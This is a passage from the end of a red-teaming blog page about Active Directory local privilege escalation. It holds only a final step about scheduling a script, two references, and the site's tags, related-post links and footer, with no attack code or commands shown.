</span></pre></table></code></div></div><li>Then, run the script to verify it works correctly. If it does, you should automate this procedure by creating a Scheduled Task.</ol><h1 id="references">References</h1><ol><li><a href="https://tryhackme.com/room/windowsprivescarena">https://tryhackme.com/room/windowsprivescarena</a><li><a href="https://docs.microsoft.com/en-us/">https://docs.microsoft.com/en-us/</a></ol><p>If you find my articles interesting, you can buy me a coffee</p><p><a href="https://www.buymeacoffee.com/0xStarlight"><img data-src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&amp;emoji=&amp;slug=0xStarlight&amp;button_colour=b86e19&amp;font_colour=ffffff&amp;font_family=Poppins&amp;outline_colour=ffffff&amp;coffee_colour=FFDD00" data-proofer-ignore></a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/red-teaming/'>Red-Teaming</a>, <a href='/categories/active-directory-local-privilege-escalation/'>Active-Directory-Local-Privilege-Escalation</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/active-directory-local-privilege-escalation/" class="post-tag no-text-decoration" >active-directory-local-privilege-escalation</a> <a href="/tags/windows-local-privilege-escalation/" class="post-tag no-text-decoration" >windows-local-privilege-escalation</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Active Directory - Local Privilege Escalation - 0xStarlight&amp;url=https://0xstarlight.github.io/posts/Active-Directory-Windows-Local-Priv-Esc/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Active Directory - Local Privilege Escalation - 0xStarlight&amp;u=https://0xstarlight.github.io/posts/Active-Directory-Windows-Local-Priv-Esc/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://0xstarlight.github.io/posts/Active-Directory-Windows-Local-Priv-Esc/&amp;text=Active Directory - Local Privilege Escalation - 0xStarlight" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Active-Directory-Domain-Persistence/">Active Directory - Domain Persistence</a><li><a href="/posts/Active-Directory-Lateral-Movement/">Active Directory - Lateral Movement</a><li><a href="/posts/Active-Directory-Introduction/">Active Directory - Introduction</a><li><a href="/posts/CRTE-Exam-Review/">CRTE Exam Review</a><li><a href="/posts/Bypassing-Windows-Defender/">Bypassing Windows Defender</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Active-Directory-Introduction/"><div class="card-body"> <em class="timeago small" data-ts="1648537560" > 2022-03-29 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Introduction</h3><div class="text-muted small"><p> Introduction Welcome to my first article in the Red Teaming Series (Active Directory Introduction). I hope to provide you all with information for an initial foundation and motivation about Acti...</p></div></div></a></div><div class="card"> <a href="/posts/Offensive-powershell/"><div class="card-body"> <em class="timeago small" data-ts="1648612260" > 2022-03-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Offensive PowerShell</h3><div class="text-muted small"><p> Introduction Welcome to my second article in the Red Teaming Series (Offensive PowerShell). I hope everyone has gone through the first article of this series which explains the basic foundations...</p></div></div></a></div><div class="card"> <a href="/posts/Active-Directory-Lateral-Movement/"><div class="card-body"> <em class="timeago small" data-ts="1649404500" > 2022-04-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Lateral Movement</h3><div class="text-muted small"><p> Introduction Welcome to my fourth article in the Red Teaming Series (Active Directory Lateral Movement). I hope everyone has gone through the previous articles of this series which go through th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Offensive-powershell/" class="btn btn-outline-primary" prompt="Older"><p>Active Directory - Offensive PowerShell</p></a> <a href="/posts/HTB-Shibboleth/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - Shibboleth</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
